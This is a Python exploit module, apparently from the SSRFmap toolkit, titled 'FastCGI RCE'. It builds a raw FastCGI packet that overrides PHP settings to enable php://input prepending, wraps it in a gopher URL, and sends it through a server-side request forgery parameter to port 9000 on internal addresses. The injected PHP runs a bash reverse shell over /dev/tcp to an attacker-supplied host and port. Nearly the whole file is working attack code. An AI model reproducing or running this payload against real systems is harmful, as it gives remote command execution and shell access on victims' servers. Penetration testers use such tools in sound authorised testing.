from ssrfmap.core.utils import *
import logging

name          = "fastcgi"
description   = "FastCGI RCE"
author        = "Unknown"
documentation = []

class exploit():
    SERVER_HOST = "127.0.0.1"
    SERVER_PORT = "4242"

    def __init__(self, requester, args):
        logging.info("Module '{}' launched !".format(name))

        # Handle args for reverse shell
        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
        else:                  self.SERVER_HOST = args.lhost

        if args.lport == None: self.SERVER_PORT = input("Server Port:")
        else:                  self.SERVER_PORT = args.lport

        # Using a generator to create the host list
        # Edit the following ip if you need to target something else
        gen_host = gen_ip_list("127.0.0.1", args.level)
        for ip in gen_host:

            # Data and port for the service
            port = "9000"
            data = "%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%10%00%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH97%0E%04REQUEST_METHODPOST%09%5BPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Asafe_mode%20%3D%20Off%0Aauto_prepend_file%20%3D%20php%3A//input%0F%13SCRIPT_FILENAME/var/www/html/1.php%0D%01DOCUMENT_ROOT/%01%04%00%01%00%00%00%00%01%05%00%01%00a%07%00%3C%3Fphp%20system%28%27bash%20-i%20%3E%26%20/dev/tcp/SERVER_HOST/SERVER_PORT%200%3E%261%27%29%3Bdie%28%27-----0vcdb34oju09b8fd-----%0A%27%29%3B%3F%3E%00%00%00%00%00%00%00"
            payload = wrapper_gopher(data, ip , port)

            # Handle args for reverse shell
            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)

            # Send the payload
            r = requester.do_request(args.param, payload)